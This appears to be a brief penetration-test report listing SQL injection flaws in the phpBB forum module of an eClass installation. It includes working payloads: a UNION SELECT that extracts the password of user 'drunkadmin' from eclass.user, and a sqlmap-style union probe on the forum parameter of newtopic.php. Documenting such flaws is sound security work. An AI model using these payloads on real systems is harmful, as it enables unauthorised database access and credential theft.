# Security Rapport

## SQLi

### Tags
- Time-based -> T
- Boolean    -> B
- Union      -> U

### /modules/phpbb/
- `viewtopic.php`: ?topic=1&forum=1: topic param injectable: TBU
    -  **AND 12 = 13 ) UNION SELECT password, password FROM eclass.user WHERE username="drunkadmin" --+**

- `reply.php`: ?topic=1&forum=1: same as above.

- `newtopic.php`: ?subject=dasd&Dialog1=on&Dialog2=on&Dialog3=on&Dialog4=on&Dialog5=on&Dialog6=on&message=da&forum=1&submit=,
                    forum param injectable: TBU,
    - **subject=dasd&Dialog1=on&Dialog2=on&Dialog3=on&Dialog4=on&Dialog5=on&Dialog6=on&message=da&forum=-9196 UNION ALL SELECT CONCAT(0x7171767171,0x43586c6d6d437675427477685178697356526b754747774876676c514f4c616c454669716742744d,0x716b7a6271)-- -&submit=**
